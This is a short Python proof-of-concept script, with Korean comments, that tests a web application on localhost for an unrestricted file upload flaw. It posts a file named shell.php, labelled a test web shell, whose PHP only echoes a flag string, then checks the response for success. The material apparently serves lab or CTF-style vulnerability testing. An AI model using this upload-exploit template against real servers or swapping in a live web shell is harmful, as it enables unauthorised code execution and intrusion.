# File Upload PoC - poc.py (template 기반)
import requests

TARGET = "http://localhost:3000"
ENDPOINT = "/upload"
FULL_URL = TARGET + ENDPOINT

# 테스트용 웹쉘 파일 (PHP 파일처럼 동작하는 텍스트 파일)
files = {
    "file": ("shell.php", "<?php echo 'FLAG{UPLOAD_SUCCESS}'; ?>", "application/x-php")
}

def run_poc():
    print(f"[+] Uploading file to {FULL_URL}")
    res = requests.post(FULL_URL, files=files)

    if "Upload success" in res.text or "FLAG" in res.text:
        print("[+] PoC 성공: File Upload 가능!")
        print(res.text)
    else:
        print("[-] PoC 실패: 업로드 차단됨")

if __name__ == "__main__":
    run_poc()